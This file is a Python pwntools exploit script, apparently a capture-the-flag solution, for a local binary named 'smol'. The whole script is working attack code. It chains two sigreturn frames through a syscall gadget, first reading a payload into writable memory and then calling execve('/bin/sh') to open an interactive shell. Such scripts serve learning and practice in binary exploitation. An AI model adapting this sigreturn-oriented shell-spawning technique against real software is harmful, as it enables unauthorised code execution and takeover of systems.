#!/usr/bin/env python3
# -=-<[ Bismillahirrahmanirrahim ]>-=-
# -*- coding: utf-8 -*-
# @Date    : 2022-09-23 13:09:22.726650
# @Author  : Dahir Muhammad Dahir (dahirmuhammad3@gmail.com)
# @Link    : link
# @Version : 1.0.0


from pwn import *

context.arch = "amd64"

filename = "./smol"
binary_target = ELF(filename)
target_process = process(filename)


def exploit():
    syscall_gadget = 0x40100a
    read_syscall = 0x0
    sigret_syscall = 0xf
    execve_syscall = 0x3b
    writable_bss = 0x402400
    main_address = 0x40100d
    read_address = 0x401023
    sigframe_size = 248
    fake_stack = writable_bss
    bin_sh = b"/bin/sh\x00"

    padding = cyclic(0x10)

    read_frame = SigreturnFrame()

    read_frame.rip = syscall_gadget
    read_frame.rax = read_syscall
    read_frame.rdi = 0x0
    read_frame.rsi = writable_bss
    # padding[8] +  main_addr[8] + syscall_gadget[8] + sigframe[248]
    read_frame.rdx = 248 + 0x8 + 0x8 + 0x8
    read_frame.rsp = fake_stack

    read_frame_bytes = bytes(read_frame)

    execve_frame = SigreturnFrame()

    execve_frame.rip = syscall_gadget
    execve_frame.rax = execve_syscall
    # address of "/bin/sh\x00" on the fake_stack
    execve_frame.rdi = writable_bss + 248 + 8 + 8
    execve_frame.rsi = 0x0
    execve_frame.rdx = 0x0

    execve_frame_bytes = bytes(execve_frame)

    read_payload = flat(padding, main_address, syscall_gadget, read_frame_bytes)
    execve_payload = flat(main_address, syscall_gadget, execve_frame_bytes, bin_sh)

    # sending first payload to perform a read with our sigret frame
    my_pause(f"press enter to send read payload, length: {len(read_payload)}")
    my_send(read_payload)

    # read 0xf bytes to set rax = 0xf which is sigret syscall number
    my_pause("press enter to send payload, set rax=0xf")
    my_send(cyclic(0xf))

    # sending second payload with execve sigret frame
    my_pause("press enter to send execve payload")
    my_send(execve_payload)

    # read 0xf bytes to set rax = 0xf, but also accounting for
    # overwritten bytes and resending
    my_pause("press enter to send payload, set rax=0xf")
    my_send(cyclic(0x8) + execve_payload[:0xf-0x8])

    # enjoy your shell and cat flag.txt
    target_process.interactive()


def debug():
    pass
    

def my_send_line(data) -> None:
    target_process.sendline(data)


def my_send(data) -> None:
    target_process.send(data)


def my_pause(msg = ""):
    if msg: print(msg)
    pause()


if __name__ == "__main__":
    # debug()
    exploit()
    # solve()
